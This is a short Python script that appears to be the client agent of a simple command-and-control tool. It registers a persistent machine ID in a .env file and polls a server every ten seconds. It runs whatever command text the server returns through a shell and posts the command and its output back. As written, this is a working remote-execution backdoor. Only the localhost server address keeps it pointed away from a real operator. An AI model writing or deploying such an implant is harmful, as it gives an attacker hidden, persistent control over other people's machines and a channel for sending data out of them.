import requests
from uuid import uuid4
from subprocess import getoutput
from dotenv import dotenv_values, set_key
from time import sleep
from datetime import datetime

api_url = "http://127.0.0.1:5000"


def execute_cmd_from_server(machinde_id: str) -> None:
    try:
        cmd = requests.get(f"{api_url}/{machinde_id}/api")
    except requests.exceptions.ConnectionError:
        sleep(60)
        return

    curr_time = datetime.now().strftime("%H:%M:%S")
    if cmd.status_code == 200 and cmd.text != "nothing_to_execute":
        output = getoutput(cmd.text)
        data: dict = {"time": curr_time, "cmd": cmd.text, "output": output}
        requests.post(f"{api_url}/{machinde_id}/api", json=data)


if __name__ == "__main__":

    config = dotenv_values(".env")
    machinde_id = config.get("machinde_id")
    if machinde_id is None:
        machinde_id = str(uuid4())
        set_key(".env", "machinde_id", machinde_id)

    while True:
        execute_cmd_from_server(machinde_id)
        sleep(10)
